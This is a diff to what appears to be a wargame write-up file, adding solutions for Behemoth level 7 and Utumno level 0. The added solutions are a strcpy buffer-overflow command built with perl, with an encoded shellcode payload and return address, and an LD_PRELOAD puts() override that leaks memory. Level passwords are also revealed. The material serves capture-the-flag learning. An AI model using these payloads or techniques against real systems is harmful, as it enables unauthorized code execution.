@@ -444,7 +444,72 @@ password = sV17oOQTKc
 ###############################################################################
 
 Level 7
+Exploit: Buffer Overflow
+
+strcpy buffer overflow
+./behemoth7 $(perl -e 'print "A"x528 . "B"x4')
+  segfaults at 0x42424242 
+  
+$(perl -e 'print "\x90"x528 . "B"x4') 
+  results in Non-alpha chars found in string
+
+$(perl -e 'print "A"x528 . "B"x4 . "\x90" x100')
+  placing shellcode at the end is not checked
+
+./behemoth7 $(perl -e 'print "A"x528 . "\x2c\xd0\xff\xff"x4 . "\x90"x100 .
+"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05
+\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69
+\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+password = 8yWcelJd0D
+
+
+################################### Utumno ###################################
+
+Level 0
+Exploit: LD_PRELOAD Memory Leaking
+
+The executable file is readonly. Thus cannot use gdb, ldd, ltrace, etc. 
+The binary prints out a message, so use LD_PRELOAD to overwrite the puts()
+function. 
+
+Leak memory with:
+int puts(const char* str) {
+    printf("Leaking Memory: %08x.%08x. ...\n");
+}
+
+We find a few addresses that are in user space. Printout the memory locations
+as strings 
+
+password: ytvWa6DzmL
+
+###############################################################################
+
+Level 1
 Exploit:
-password = 
+
+LD_PRELOAD strncmp to print out the parameters
+
+password: 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
